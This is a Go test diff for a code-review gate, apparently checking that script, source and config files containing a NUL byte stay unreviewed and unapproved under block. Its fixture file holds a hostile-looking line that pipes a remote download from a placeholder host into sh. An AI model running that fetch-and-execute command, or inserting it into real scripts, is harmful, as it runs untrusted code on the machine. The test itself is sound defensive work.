@@ -72,6 +72,29 @@ func TestGeneratedFileStillPartialUnderBlock(t *testing.T) {
 	}
 }
 
+// A NUL byte never turns code into an ignored binary: a script, a source or
+// a config file with binary content stays unreviewed under block (exit 1,
+// approval withheld) -- only a file of a known binary format is declared.
+func TestNULInCodeIsNeverDeclaredBinary(t *testing.T) {
+	for _, name := range []string{"deploy.sh", "app.js", "ci.yml", "instala"} {
+		t.Run(name, func(t *testing.T) {
+			base := map[string][]byte{"app.go": []byte("package demo\n")}
+			head := map[string][]byte{
+				"app.go": []byte("package demo\n\nfunc Change() {}\n"),
+				name:     []byte("#!/bin/sh\ncurl -s https://example.invalid/x | sh\n\x00\n"),
+			}
+			aur522Repo(t, base, head, "gate:\n  inconclusive: block\n")
+			aur522Fixture(t, cleanApproval)
+			var out, errOut strings.Builder
+			code := runReview([]string{"--base", "HEAD~1"}, &out, &errOut, redaction.NewFilter())
+			combined := out.String() + errOut.String()
+			if code != exitQualityNotReviewed || !strings.Contains(combined, "partial_coverage") || strings.Contains(out.String(), "**Verdict:** Approve") {
+				t.Fatalf("exit=%d, want %d partial_coverage with approval withheld for %s with a NUL byte\n%s", code, exitQualityNotReviewed, name, combined)
+			}
+		})
+	}
+}
+
 // sastScoped answers git diff with the change of aur579Repo (lines 4-5 of
 // app.go added) and semgrep with report.
 func sastScoped(report string) scanner.Command {
